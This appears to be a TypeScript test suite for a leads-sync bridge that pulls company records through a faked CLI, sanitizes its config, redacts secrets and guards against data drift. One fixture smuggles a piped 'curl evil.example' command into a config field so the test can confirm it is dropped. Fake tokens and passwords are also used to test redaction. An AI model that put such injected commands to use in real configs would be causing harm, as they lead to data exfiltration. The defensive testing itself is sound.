import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { createLeadsBridge, LeadsSyncError, type LeadsSnapshot } from "./leads-bridge.ts";
import { createLocalRouter } from "./local-router.ts";
import {
  DEFAULT_LEADS_CONFIG_PATH,
  DEFAULT_LEADS_SNAPSHOT_PATH,
  sanitizeLeadsConfig,
} from "./leads/leads-config.ts";
import {
  DEFAULT_PRIORITY,
  normProvince,
  normTrack,
  normalizeLeadCells,
  parseTier,
  projectLeadRow,
  redact,
  sortLeads,
  TIER_ORDER,
} from "./leads/leads-model.ts";
import {
  parseDwsJson,
  RECORD_QUERY_TIMEOUT_MS,
  resolveDwsBin,
  TABLE_GET_TIMEOUT_MS,
  type LeadsCommandRunner,
} from "./leads/leads-sync.ts";
import type { LeadRow } from "./leads/leads-types.ts";

// ---------------------------------------------------------------------------
// 合成数据约定：企业「甲科技有限公司 / 乙股份有限公司」、baseId/tableId 均为
// 合成值（bse-syn / tbl-syn-01），绝无真实表格 ID、真实企业与真实联系人；
// dws 全程用 fake runner，真实 CLI 进程一个都不碰（本机无凭据，绝不跑真实拉取）。
// ---------------------------------------------------------------------------

const CONFIG = {
  baseId: "bse-syn",
  tableId: "tbl-syn-01",
  viewId: "viw-syn-01",
  tableName: "拓新企业清单",
  priorityProvinces: ["北京", "山东"],
  radarCmd: "",
};

/** 字段名白名单 fixture：与 FIELD_MAP 对齐；电话/邮箱/法定代表人为白名单外敌意列。 */
const FIELDS: Record<string, string> = {
  f_name: "企业名称", f_legal: "法律实体", f_tier: "Name判定", f_state: "CRM状态",
  f_score: "综合分", f_prio: "优先级", f_prov: "省份", f_city: "城市", f_track: "赛道",
  f_sum: "一句话", f_sig: "信号类型", f_sigat: "最新信号时间", f_cid: "CID",
  f_radar: "雷达更新时间", f_founder: "创始人", f_phone: "电话", f_email: "邮箱", f_rep: "法定代表人",
};

function nameOfFixture(): Record<string, string> {
  return { ...FIELDS };
}

function cellsOf(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    f_name: "甲科技有限公司",
    f_legal: "甲科技（合成）有限公司",
    f_tier: "A",
    f_state: "A-试点",
    f_score: "82",
    f_prio: "P1",
    f_prov: "北京市",
    f_city: "北京",
    f_track: "算力调度",
    f_sum: "合成一句话概述",
    f_sig: "融资",
    f_sigat: "2026-10-19",
    f_cid: "CID-SYN-001",
    f_radar: "2026-10-19T22:00:00.000Z",
    ...overrides,
  };
}

function tableMeta(tableName = "拓新企业清单", fields: Record<string, string> = FIELDS): unknown {
  return {
    success: true,
    data: {
      tables: [{
        tableId: "tbl-syn-01",
        tableName,
        fields: Object.entries(fields).map(([fieldId, fieldName]) => ({ fieldId, fieldName })),
        views: [{ viewId: "viw-syn-01", name: "全部（合成）" }],
      }],
    },
  };
}

function recordQuery(records: unknown[], extra: Record<string, unknown> = {}): unknown {
  return { success: true, data: { complete: true, records, ...extra } };
}

function syntheticRecords(count: number, overrides: Record<string, unknown> = {}): unknown[] {
  return Array.from({ length: count }, (_, index) => ({
    recordId: `rec-syn-${String(index + 1).padStart(2, "0")}`,
    cells: cellsOf({ f_cid: `CID-SYN-${String(index + 1).padStart(3, "0")}`, ...overrides }),
  }));
}

interface CliReply {
  readonly code?: number | string;
  readonly stdout?: string;
  readonly stderr?: string;
}

interface DwsHandlers {
  readonly tableGet?: (args: readonly string[], timeoutMs: number) => CliReply;
  readonly recordQuery?: (args: readonly string[], timeoutMs: number) => CliReply;
  readonly onCall?: (file: string, args: readonly string[], timeoutMs: number) => void;
}

/** dws 桩：只认 table get / record query 两条只读命令；其余一律 ENOENT。 */
function fakeDws(handlers: DwsHandlers = {}): LeadsCommandRunner {
  return async (file, args, options) => {
    handlers.onCall?.(file, args, options.timeoutMs);
    if (file !== "dws") return { code: "ENOENT", stdout: "", stderr: "" };
    if (args.includes("table") && args.includes("get")) {
      return handlers.tableGet?.(args, options.timeoutMs) ?? { code: 0, stdout: JSON.stringify(tableMeta()) };
    }
    if (args.includes("record") && args.includes("query")) {
      return handlers.recordQuery?.(args, options.timeoutMs) ?? { code: 0, stdout: JSON.stringify(recordQuery([])) };
    }
    return { code: "ENOENT", stdout: "", stderr: "" };
  };
}

const enoentRunner: LeadsCommandRunner = async () => ({ code: "ENOENT", stdout: "", stderr: "" });

async function withTempDir(run: (dir: string) => Promise<void>): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), "leads-bridge-"));
  try {
    await run(dir);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

function writeConfig(dir: string, config: unknown): Promise<void> {
  return writeFile(join(dir, "leads.json"), JSON.stringify(config), "utf-8");
}

async function writePreviousSnapshot(dir: string, total: number): Promise<string> {
  const path = join(dir, "leads-snapshot.json");
  const previous = {
    fetchedAt: "2026-10-19T02:00:00.000Z", status: "ok", source: "dingtalk-aitable",
    tableName: "拓新企业清单", url: "", radarAt: "", priorityProvinces: [], radarCmd: "",
    total, rows: [],
  };
  const content = `${JSON.stringify(previous, null, 2)}\n`;
  await writeFile(path, content, "utf-8");
  return content;
}

interface BridgeOptions {
  readonly run?: LeadsCommandRunner;
  readonly config?: unknown;
  readonly omitConfig?: boolean;
}

async function makeBridge(dir: string, options: BridgeOptions = {}) {
  if (!options.omitConfig) await writeConfig(dir, options.config ?? CONFIG);
  return createLeadsBridge({
    configPath: join(dir, "leads.json"),
    snapshotPath: join(dir, "leads-snapshot.json"),
    run: options.run ?? fakeDws(),
    env: {},
    now: () => Date.parse("2026-10-20T02:00:00.000Z"),
  });
}

function snapshotPathOf(dir: string): string {
  return join(dir, "leads-snapshot.json");
}

// ---------------------------------------------------------------------------
// 1. 配置降级与默认路径
// ---------------------------------------------------------------------------

test("default config and snapshot paths resolve to the project-root .local-cache", () => {
  assert.match(DEFAULT_LEADS_CONFIG_PATH, /[\\/]\.local-cache[\\/]leads\.json$/);
  assert.match(DEFAULT_LEADS_SNAPSHOT_PATH, /[\\/]\.local-cache[\\/]leads-snapshot\.json$/);
  assert.ok(!DEFAULT_LEADS_CONFIG_PATH.includes(join("dev", ".local-cache")), "must not resolve under dev/");
});

test("missing or corrupt config answers configured:false and never throws", async () => {
  await withTempDir(async (dir) => {
    const missing = await (await makeBridge(dir, { omitConfig: true })).snapshot();
    assert.equal(missing.configured, false);
    assert.equal(missing.hasData, false);
    assert.deepEqual(missing.rows, []);
    assert.match(missing.configNote, /leads\.json/);
    assert.match(missing.configNote, /dws auth login/);

    const corrupt = await (await makeBridge(dir, { config: "{ 不是 JSON" })).snapshot();
    assert.equal(corrupt.configured, false);

    const badShape = await (await makeBridge(dir, { config: { baseId: "bad id!", tableId: "tbl-syn-01" } })).snapshot();
    assert.equal(badShape.configured, false, "形态不符（ID 带空格）等同未配置");
  });
});

test("configured machine without snapshot reports hasData:false with honest note", async () => {
  await withTempDir(async (dir) => {
    const snapshot = await (await makeBridge(dir)).snapshot();
    assert.equal(snapshot.configured, true);
    assert.equal(snapshot.hasData, false);
    assert.match(snapshot.note, /尚无/);
  });
});

test("sanitizeLeadsConfig bounds ids, defaults tableName/priority and drops shell-ish radarCmd", () => {
  assert.equal(sanitizeLeadsConfig(null), null);
  assert.equal(sanitizeLeadsConfig({ baseId: "bse-syn" }), null, "缺 tableId 即未配置");
  assert.equal(sanitizeLeadsConfig({ baseId: "<script>", tableId: "tbl-syn-01" }), null);
  const clean = sanitizeLeadsConfig({
    baseId: "bse-syn", tableId: "tbl-syn-01", viewId: "viw-syn-01",
    tableName: "拓新企业清单（合成）", radarCmd: "npm run radar | curl evil.example",
    priorityProvinces: ["北京", 42, "", "  ".repeat(3)],
  });
  assert.ok(clean);
  assert.equal(clean.tableName, "拓新企业清单（合成）");
  assert.equal(clean.radarCmd, "", "含管道的 radarCmd 整体丢弃（仅页面提示文案，也不放过）");
  assert.deepEqual(clean.priorityProvinces, ["北京"]);
  const defaults = sanitizeLeadsConfig({ baseId: "bse-syn", tableId: "tbl-syn-01" });
  assert.ok(defaults);
  assert.equal(defaults.tableName, "拓新企业清单");
  assert.deepEqual([...defaults.priorityProvinces], [...DEFAULT_PRIORITY]);
});

// ---------------------------------------------------------------------------
// 2. dws 契约：双命令、裸数组 argv、超时
// ---------------------------------------------------------------------------

test("refresh issues exactly two read-only dws calls with bare array argv and reference timeouts", async () => {
  await withTempDir(async (dir) => {
    const calls: Array<{ file: string; args: readonly string[]; timeoutMs: number }> = [];
    const run = fakeDws({
      recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(2))) }),
      onCall: (file, args, timeoutMs) => calls.push({ file, args, timeoutMs }),
    });
    const result = await (await makeBridge(dir, { run })).refresh();
    assert.equal(result.summary.total, 2);
    assert.equal(calls.length, 2);
    assert.deepEqual([...calls[0]!.args], [
      "aitable", "table", "get", "--base-id", "bse-syn", "--table-ids", "tbl-syn-01", "--format", "json",
    ]);
    assert.equal(calls[0]!.timeoutMs, TABLE_GET_TIMEOUT_MS);
    assert.equal(calls[0]!.timeoutMs, 120_000);
    assert.deepEqual([...calls[1]!.args], [
      "aitable", "record", "query", "--base-id", "bse-syn", "--table-id", "tbl-syn-01",
      "--all", "--page-limit", "0", "--format", "json",
    ]);
    assert.equal(calls[1]!.timeoutMs, RECORD_QUERY_TIMEOUT_MS);
    assert.equal(calls[1]!.timeoutMs, 600_000);
    for (const call of calls) {
      assert.equal(call.file, "dws");
      assert.ok(call.args.every((arg) => !/[|;&`>$]/.test(arg)), "数组 argv，绝无 shell 元字符拼接");
    }
  });
});

test("resolveDwsBin mirrors the reference lookup order and parseDwsJson tolerates noisy output", () => {
  const noFs = () => false;
  assert.equal(resolveDwsBin({ QODERWAKE_DWS_CLI_PATH: "/synthetic/dws" }, noFs), "/synthetic/dws");
  assert.equal(resolveDwsBin({ DWS_BIN: "/synthetic/dws2" }, noFs), "/synthetic/dws2");
  assert.equal(
    resolveDwsBin({ HOME: "/home/syn" }, (p) => p === "/home/syn/.qoder/bin/dws"),
    "/home/syn/.qoder/bin/dws",
  );
  assert.equal(resolveDwsBin({}, noFs), "dws");

  const payload = parseDwsJson("warn: ignore me\n{\"success\":true,\"data\":{}}\ntrailing line\n");
  assert.deepEqual(payload, { success: true, data: {} });
  try {
    parseDwsJson("totally not json");
    assert.fail("must throw");
  } catch (error) {
    assert.ok(error instanceof LeadsSyncError);
    assert.equal((error as LeadsSyncError).code, "leads_unavailable");
  }
});

// ---------------------------------------------------------------------------
// 3. 四重护栏：各自拒绝且旧快照原样保留（绝不降级覆盖）
// ---------------------------------------------------------------------------

test("guardrail: table-name drift rejects and keeps the previous snapshot untouched", async () => {
  await withTempDir(async (dir) => {
    const previous = await writePreviousSnapshot(dir, 5);
    const run = fakeDws({ tableGet: () => ({ code: 0, stdout: JSON.stringify(tableMeta("别的表名（合成）")) }) });
    const bridge = await makeBridge(dir, { run });
    await assert.rejects(
      () => bridge.refresh(),
      (error: unknown) => error instanceof LeadsSyncError && error.code === "leads_table_drift",
    );
    assert.equal(await readFile(snapshotPathOf(dir), "utf-8"), previous, "旧快照必须原样保留");
  });
});

test("guardrail: missing required fields (schema drift) rejects", async () => {
  await withTempDir(async (dir) => {
    await writePreviousSnapshot(dir, 5);
    const stripped = { ...FIELDS };
    delete stripped.f_cid;
    const run = fakeDws({ tableGet: () => ({ code: 0, stdout: JSON.stringify(tableMeta("拓新企业清单", stripped)) }) });
    await assert.rejects(
      async () => (await makeBridge(dir, { run })).refresh(),
      (error: unknown) => error instanceof LeadsSyncError
        && error.code === "leads_field_drift"
        && /CID/.test(error.message),
    );
  });
});

test("guardrail: unexpected empty table rejects; a genuinely fresh empty pull is allowed", async () => {
  await withTempDir(async (dir) => {
    const previous = await writePreviousSnapshot(dir, 5);
    const run = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery([])) }) });
    const bridge = await makeBridge(dir, { run });
    await assert.rejects(
      () => bridge.refresh(),
      (error: unknown) => error instanceof LeadsSyncError && error.code === "leads_empty",
    );
    assert.equal(await readFile(snapshotPathOf(dir), "utf-8"), previous);

    // 首次拉取（此前无快照）遇到空表：允许落 0 条快照，绝不造数据。
    const freshDir = join(dir, "fresh");
    await mkdir(freshDir, { recursive: true });
    const fresh = await makeBridge(freshDir, { run });
    const result = await fresh.refresh();
    assert.equal(result.summary.total, 0);
    const stored = JSON.parse(await readFile(snapshotPathOf(freshDir), "utf-8")) as { total: number };
    assert.equal(stored.total, 0);
  });
});

test("guardrail: halved record count rejects and allowShrink is the explicit escape hatch", async () => {
  await withTempDir(async (dir) => {
    const previous = await writePreviousSnapshot(dir, 12);
    const run = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(5))) }) });
    const bridge = await makeBridge(dir, { run });
    await assert.rejects(
      () => bridge.refresh(),
      (error: unknown) => error instanceof LeadsSyncError
        && error.code === "leads_shrink"
        && /12 降至 5/.test(error.message),
    );
    assert.equal(await readFile(snapshotPathOf(dir), "utf-8"), previous);

    const bypass = await bridge.refresh({ allowShrink: true });
    assert.equal(bypass.summary.total, 5, "显式 allowShrink 才放行（原样移植的逃生口）");
  });
});

test("guardrail: incomplete pagination (complete:false / hasMore / cursor) rejects", async () => {
  await withTempDir(async (dir) => {
    await writePreviousSnapshot(dir, 5);
    const cases: Array<[string, Record<string, unknown>]> = [
      ["complete:false", { complete: false }],
      ["hasMore:true", { hasMore: true }],
      ["cursor", { cursor: "cur-syn-next" }],
      ["nextCursor", { nextCursor: "cur-syn-next" }],
      ["fetchedCount mismatch", { fetchedCount: 99 }],
    ];
    for (const [label, extra] of cases) {
      const run = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(2), extra)) }) });
      await assert.rejects(
        async () => (await makeBridge(dir, { run })).refresh(),
        (error: unknown) => error instanceof LeadsSyncError && error.code === "leads_pagination",
        `应拒绝：${label}`,
      );
    }
  });
});

// ---------------------------------------------------------------------------
// 4. 白名单 + 哨兵：联系人字段与密钥模式物理不入快照
// ---------------------------------------------------------------------------

test("sentinel: hostile contact fields and secret patterns never reach the snapshot or bridge rows", async () => {
  await withTempDir(async (dir) => {
    const hostileRecords = [{
      recordId: "rec-syn-hostile",
      cells: cellsOf({
        f_phone: "13800001111",
        f_email: "boss@example.com",
        f_rep: "合成法人",
        f_sum: "接入了 sk-synthetic0123456789abcd 平台，token: AbCdEf0123456789abc 待核实",
        f_founder: "合成创始人",
      }),
    }];
    const run = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(hostileRecords)) }) });
    const result = await (await makeBridge(dir, { run })).refresh();
    assert.equal(result.summary.total, 1);

    const serialized = await readFile(snapshotPathOf(dir), "utf-8");
    for (const forbidden of ["电话", "邮箱", "法定代表人", "13800001111", "boss@example.com", "sk-synthetic", "AbCdEf0123456789"]) {
      assert.equal(serialized.includes(forbidden), false, `快照不得包含：${forbidden}`);
    }
    assert.ok(serialized.includes("[已脱敏]"), "自由文本密钥模式已被 redact");
    assert.ok(serialized.includes("合成创始人"), "白名单内字段照常保留");

    const row = result.snapshot.rows[0]!;
    assert.equal(row.name, "甲科技有限公司");
    assert.equal(row.score, 82);
    assert.equal(row.tier, "A");
    assert.equal(row.province, "北京");
    assert.equal(row.isPriority, true, "北京在配置的优先省里");

    // 快照读回路径同样过白名单：手改快照塞入联系人字段也进不了 bridge.rows。
    const parsed = JSON.parse(serialized) as { rows: Array<Record<string, unknown>> };
    parsed.rows[0]!.电话 = "13900002222";
    const projected = projectLeadRow(parsed.rows[0]);
    assert.ok(projected);
    assert.equal(JSON.stringify(projected).includes("13900002222"), false);
    assert.equal(JSON.stringify(await (await makeBridge(dir)).snapshot().then((s) => JSON.stringify(s.rows))).includes("13800001111"), false);
  });
});

// ---------------------------------------------------------------------------
// 5. 归一口径：TIER / TRACKS / 省份 / 占位清洗 / sortLeads
// ---------------------------------------------------------------------------

test("parseTier keeps the reference tier ladder including ★ and pending fallback", () => {
  assert.equal(parseTier("★", ""), "ME");
  assert.equal(parseTier("ME", ""), "ME");
  assert.equal(parseTier("A?", ""), "A?");
  assert.equal(parseTier("B2", ""), "B2");
  assert.equal(parseTier("A-试点", ""), "A");
  assert.equal(parseTier("", "D-暂缓"), "D");
  assert.equal(parseTier("Pending-人工", ""), "pending");
  assert.equal(parseTier("", ""), "pending");
  assert.equal(TIER_ORDER.pending < TIER_ORDER.D, true, "pending 排在 D 之前");
});

test("normTrack maps the 11 reference buckets and falls back to 其他", () => {
  const expected: Array<[string, string]> = [
    ["人形机器人整机", "具身智能/机器人"],
    ["语音识别", "AI语音/音频"],
    ["AI4S 制药", "AI4S/医药"],
    ["生命科学信息化", "AI4S/医药"],
    ["自动驾驶算法", "自动驾驶"],
    ["端侧芯片", "AI硬件/端侧"],
    ["AI Infra 平台", "AI Infra/算力"],
    ["代码助手 Coding", "AI编程"],
    ["智能体 Agent 平台", "Agent/智能体"],
    ["视频生成多模态", "多模态/视频生成"],
    ["基座大模型 LLM", "大模型/基座"],
    ["AI+行业应用", "AI+行业应用"],
    ["", "其他"],
    ["合成无归类赛道", "其他"],
  ];
  for (const [raw, want] of expected) assert.equal(normTrack(raw), want, raw);
});

test("normProvince strips suffixes, resolves municipalities and city mapping, unknown stays empty", () => {
  assert.equal(normProvince("浙江省", ""), "浙江");
  assert.equal(normProvince("黑龙江省", ""), "黑龙江");
  assert.equal(normProvince("内蒙古自治区", ""), "内蒙古");
  // 后缀剥离按静态版单趟正则口径（一次剥一个后缀），不做过头处理。
  assert.equal(normProvince("广西壮族自治区", ""), "广西壮族");
  assert.equal(normProvince("", "北京市"), "北京");
  assert.equal(normProvince("", "上海"), "上海");
  assert.equal(normProvince("", "杭州市"), "浙江");
  assert.equal(normProvince("", "苏州工业园"), "江苏");
  assert.equal(normProvince("", "合成市"), "");
});

test("placeholder values are cleaned to empty and numeric keys coerce through strings", () => {
  const normalized = normalizeLeadCells(cellsOf({
    f_name: "乙股份有限公司", f_prov: "待补全", f_city: "—", f_sum: "未知",
    f_score: "77", f_state: "待CRM扫描", f_tier: "N/A", f_uids: "5",
  }), nameOfFixture(), DEFAULT_PRIORITY);
  assert.equal(normalized.summary, "", "占位值清洗为空串");
  assert.equal(normalized.crmState, "");
  assert.equal(normalized.province, "", "省份城市皆占位 → 空省、非优先");
  assert.equal(normalized.isPriority, false);
  assert.equal(normalized.score, 77);
  assert.equal(normalized.tier, "pending", "判定无法解析 → pending");
});

test("sortLeads orders by tier ladder first then score descending, immutably", () => {
  const row = (id: string, tier: LeadRow["tier"], score: number | null): LeadRow => ({
    id, name: `合成企业-${id}`, legal: "", crmName: "", tierLabel: tier, tier, crmState: "",
    score, priority: "", province: "", city: "", track: "", trackRaw: "", summary: "", signal: "",
    round: "", amount: "", investors: "", maas: "", maasWhy: "", maasProduct: "", agent: "",
    agentWhy: "", risk: "", aliRel: "", sales: "", team: "", uids: null, cid: `CID-${id}`, ecid: "",
    mentions: null, signalAt: "", radarAt: "", news: null, sources: "", founded: "", regCap: "",
    address: "", founder: "", website: "", entStatus: "", isPriority: false,
  });
  const input = [row("r1", "pending", 99), row("r2", "D", 100), row("r3", "ME", 10), row("r4", "B", 50), row("r5", "A", 50), row("r6", "B", 80)];
  const sorted = sortLeads(input);
  assert.deepEqual(sorted.map((entry) => entry.id), ["r3", "r5", "r6", "r4", "r1", "r2"]);
  assert.equal(input[0]!.id, "r1", "输入数组不被就地修改");
});

test("redact strips long-token and credential assignment patterns from free text", () => {
  assert.equal(redact("正常描述保留"), "正常描述保留");
  assert.equal(redact("key sk-abcdef0123456789abcd 结束"), "key [已脱敏] 结束");
  assert.equal(redact("password=hunter2-master 密码"), "[已脱敏] 密码");
  assert.equal(redact("token: AbCdEf0123456789xyz 尾部"), "[已脱敏] 尾部");
});

// ---------------------------------------------------------------------------
// 6. 桥层：原子写 0600 / dws 失败如实上抛
// ---------------------------------------------------------------------------

test("successful pull writes the snapshot atomically with 0600 and honest metadata", async () => {
  await withTempDir(async (dir) => {
    const run = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(2))) }) });
    const result = await (await makeBridge(dir, { run })).refresh();
    assert.equal(result.summary.open, 2, "两条 A 档都计入可 Name");
    assert.equal(result.summary.fetchedAt, "2026-10-20T02:00:00.000Z");
    const mode = (await stat(snapshotPathOf(dir))).mode & 0o777;
    assert.equal(mode, 0o600, "快照 0600（与 crm/maas 快照同口径）");
    assert.ok(result.snapshot.url.includes("bse-syn"), "URL 由 baseId/tableId/viewId 合成");
    const snapshot = await (await makeBridge(dir)).snapshot();
    assert.equal(snapshot.configured, true);
    assert.equal(snapshot.hasData, true);
    assert.equal(snapshot.total, 2);
  });
});

test("dws missing or failing surfaces leads_unavailable with redacted reason", async () => {
  await withTempDir(async (dir) => {
    const bridge = await makeBridge(dir, { run: enoentRunner });
    await assert.rejects(
      () => bridge.refresh(),
      (error: unknown) => error instanceof LeadsSyncError
        && error.code === "leads_unavailable"
        && /dws auth login/.test(error.message),
    );
    await assert.rejects(
      () => readFile(snapshotPathOf(dir), "utf-8"),
      { code: "ENOENT" },
      "拉取失败时绝不落任何快照文件",
    );
  });
});

test("nonzero dws exit with hostile stderr maps to a redacted leads_unavailable", async () => {
  await withTempDir(async (dir) => {
    const run = fakeDws({
      tableGet: () => ({ code: 1, stdout: "", stderr: "dws: auth expired, access_token=AbCdEf0123456789xyz\n" }),
    });
    await assert.rejects(
      async () => (await makeBridge(dir, { run })).refresh(),
      (error: unknown) => {
        assert.ok(error instanceof LeadsSyncError);
        assert.equal((error as LeadsSyncError).code, "leads_unavailable");
        assert.equal((error as Error).message.includes("AbCdEf0123456789"), false, "报错信息不得携带凭据形态文本");
        return true;
      },
    );
  });
});

// ---------------------------------------------------------------------------
// 7. 路由端点（/local/leads 只读 + /local/leads/refresh 显式触发）
// ---------------------------------------------------------------------------

const TRUSTED = { host: "127.0.0.1:8000" };

function request(path: string, method: "GET" | "POST"): Request {
  return new Request(`http://127.0.0.1:8000${path}`, { method, headers: TRUSTED });
}

test("router serves GET /local/leads, rejects POST /local/leads and maps refresh outcomes", async () => {
  await withTempDir(async (dir) => {
    // 未配置机器：GET → configured:false；POST refresh → 400 leads_unconfigured；POST /local/leads → 405。
    const unconfigured = await makeBridge(dir, { omitConfig: true });
    const router = createLocalRouter({ port: 8000, leadsBridge: unconfigured });
    const ok = await router(request("/local/leads", "GET"));
    assert.equal(ok.status, 200);
    const okBody = await ok.json() as { ok: boolean; data: LeadsSnapshot };
    assert.equal(okBody.ok, true);
    assert.equal(okBody.data.configured, false);

    const badConfig = await router(request("/local/leads/refresh", "POST"));
    assert.equal(badConfig.status, 400);
    assert.equal(((await badConfig.json()) as { error: string }).error, "leads_unconfigured");

    const notAllowed = await router(request("/local/leads", "POST"));
    assert.equal(notAllowed.status, 405, "POST /local/leads 由既有 method_not_allowed 兜底");

    // 护栏拒绝 → 409 + 稳定错误码；dws 失败 → 502；成功 → 200 且 GET 可读回。
    await writeConfig(dir, CONFIG);
    await writePreviousSnapshot(dir, 12);
    const shrinkRun = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(3))) }) });
    const guardedRouter = createLocalRouter({
      port: 8000,
      leadsBridge: createLeadsBridge({
        configPath: join(dir, "leads.json"), snapshotPath: snapshotPathOf(dir),
        run: shrinkRun, env: {}, now: () => Date.parse("2026-10-20T02:00:00.000Z"),
      }),
    });
    const conflict = await guardedRouter(request("/local/leads/refresh", "POST"));
    assert.equal(conflict.status, 409);
    const conflictBody = await conflict.json() as { error: string; message: string };
    assert.equal(conflictBody.error, "leads_shrink");
    assert.match(conflictBody.message, /拒绝覆盖旧快照/);

    const failRouter = createLocalRouter({
      port: 8000,
      leadsBridge: createLeadsBridge({
        configPath: join(dir, "leads.json"), snapshotPath: snapshotPathOf(dir),
        run: enoentRunner, env: {}, now: () => Date.parse("2026-10-20T02:00:00.000Z"),
      }),
    });
    const upstream = await failRouter(request("/local/leads/refresh", "POST"));
    assert.equal(upstream.status, 502);
    assert.equal(((await upstream.json()) as { error: string }).error, "leads_unavailable");

    const goodRun = fakeDws({ recordQuery: () => ({ code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(2))) }) });
    const goodRouter = createLocalRouter({
      port: 8000,
      leadsBridge: createLeadsBridge({
        configPath: join(dir, "leads.json"), snapshotPath: join(dir, "leads-snapshot-good.json"),
        run: goodRun, env: {}, now: () => Date.parse("2026-10-20T02:00:00.000Z"),
      }),
    });
    const refreshed = await goodRouter(request("/local/leads/refresh", "POST"));
    assert.equal(refreshed.status, 200);
    const refreshedBody = await refreshed.json() as { ok: boolean; data: { summary: { total: number }; snapshot: LeadsSnapshot } };
    assert.equal(refreshedBody.data.summary.total, 2);
    assert.equal(refreshedBody.data.snapshot.configured, true);
    const readBack = await goodRouter(request("/local/leads", "GET"));
    assert.equal(((await readBack.json()) as { data: LeadsSnapshot }).data.total, 2);

    const brokenRouter = createLocalRouter({
      port: 8000,
      leadsBridge: { snapshot: async () => { throw new Error("boom"); }, refresh: async () => { throw new Error("boom"); } },
    });
    const failed = await brokenRouter(request("/local/leads", "GET"));
    assert.equal(failed.status, 502);
    assert.equal(((await failed.json()) as { error: string }).error, "leads_unavailable");
  });
});

// ---------------------------------------------------------------------------

test("concurrent refresh shares one in-flight pull (review P2-1)", async () => {
  await withTempDir(async (dir) => {
    let release: (() => void) = () => {};
    let gate: Promise<void> = new Promise<void>((resolve) => { release = resolve; });
    let recordCalls = 0;
    const run = fakeDws({
      recordQuery: async () => {
        recordCalls += 1;
        if (recordCalls === 1) await gate;
        return { code: 0, stdout: JSON.stringify(recordQuery(syntheticRecords(3))) };
      },
    });
    const bridge = await makeBridge(dir, { run });

    const first = bridge.refresh();
    const second = bridge.refresh();
    assert.ok(first === second, "并发 refresh 应共享同一 in-flight promise");
    release();
    const [a, b] = await Promise.all([first, second]);
    assert.equal(recordCalls, 1, "底层 record query 只跑一次");
    assert.equal(a.summary.total, 3);
    assert.deepEqual(a.summary, b.summary);

    // 单飞结束后允许下一次刷新（闸门清空）。
    const again = await bridge.refresh();
    assert.equal(again.summary.total, 3);
    assert.equal(recordCalls, 2);
  });
});
